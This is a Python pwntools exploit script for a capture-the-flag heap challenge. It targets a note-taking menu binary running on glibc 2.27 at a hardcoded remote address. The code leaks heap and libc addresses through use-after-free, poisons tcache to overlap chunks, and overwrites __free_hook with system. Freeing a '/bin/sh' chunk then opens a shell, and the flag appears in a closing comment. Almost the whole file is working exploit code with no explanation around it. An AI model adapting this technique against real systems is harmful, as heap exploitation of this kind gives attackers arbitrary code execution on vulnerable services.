#!/usr/bin/env python
from pwn import *
from time import sleep

exe = ELF("./task")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

sshc = None
r = None
nc = "nc 44.201.242.37 1236"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
    
    return r


def create(idx, size, content):
    r.recvuntil(b">> ")
    sendl(1)
    r.recvuntil(b">> ")
    sendl(idx)
    r.recvuntil(b">> ")
    sendl(size)
    r.recvuntil(b">> ")
    sendl(content)


def delete(idx):
    r.recvuntil(b">> ")
    sendl(2)
    r.recvuntil(b">> ")
    sendl(idx)


def edit(idx, content, nonewline=False):
    r.recvuntil(b">> ")
    sendl(3)
    r.recvuntil(b">> ")
    sendl(idx)
    r.recvuntil(b">> ")
    if nonewline:
        send(content)
    else:
        sendl(content)


def view(idx):
    r.recvuntil(b">> ")
    sendl(4)
    r.recvuntil(b">> ")
    sendl(idx)
    return r.readline().strip()


def exit():
    sendl(5)


def main():
    global r
    r = conn()
    
    SIZE = 16*3
    
    create(0, SIZE, "a"*8)
    create(1, SIZE, "a"*8)
    create(2, SIZE, "a"*8)
    
    delete(1)
    delete(2)
    
    heap_leak = u64(view(2).ljust(8, b"\0"))
    
    logh("heap_leak", heap_leak)
    chunk_0x500 = heap_leak-0x10
    chunk2 = chunk_0x500+0x500
    
    logh("chunk_0x500", chunk_0x500)
    logh("chunk2", chunk2)
    
    edit(2, p64(chunk_0x500).replace(b'\0', b''))
    
    create(3, SIZE, b"a"*8)
    
    create(4, SIZE, b"a"*16)
    edit(4, p64(0)+p64(0x501))
    
    create(5, SIZE, b"a"*16)
    
    delete(2)
    delete(5)
    
    edit(5, p64(chunk_0x500+0x500).replace(b'\0', b''))
    
    create(6, SIZE, b"a"*16)
    
    create(7, SIZE, b"a"*SIZE)
    edit(7, p64(0)+p64(0x21)+p64(0xdeadbeef)*2+p64(0)+p32(0x20cb1), True)
    
    delete(1) # We now have our libc leak
    
    libc_leak = u64(view(1).ljust(8, b"\0"))
    libc_base = libc_leak - 0x3ebca0 # main_arena offset
    
    logh("libc_leak", libc_leak)
    logh("libc_base", libc_base)
    
    # Our final move, overwrite free hook
    free_hook = libc_base + libc.symbols.__free_hook
    logh("free_hook", free_hook)
    
    # We still have plenty of space so, I'll just use new chunks
    create(8, SIZE, b"a"*SIZE)
    create(9, SIZE, b"a"*SIZE)
    
    delete(8)
    delete(9)
    
    edit(9, p64(free_hook).replace(b'\0', b''))
    
    create(10, SIZE, b"/bin/sh")
    
    create(11, SIZE, b"a"*8) # free hook
    # Write system adr properly, create uses strcpy so we'll have a problem with null bytes, edit uses read directly to write in adr so, we use that
    edit(11, p64(libc_base + libc.symbols.system)) 
    
    delete(10) # pop our shell
    
    r.interactive() # FLAG{n0t3s_tak3n_or_sh3ll_m4K1ng?}


if __name__ == "__main__":
    main()

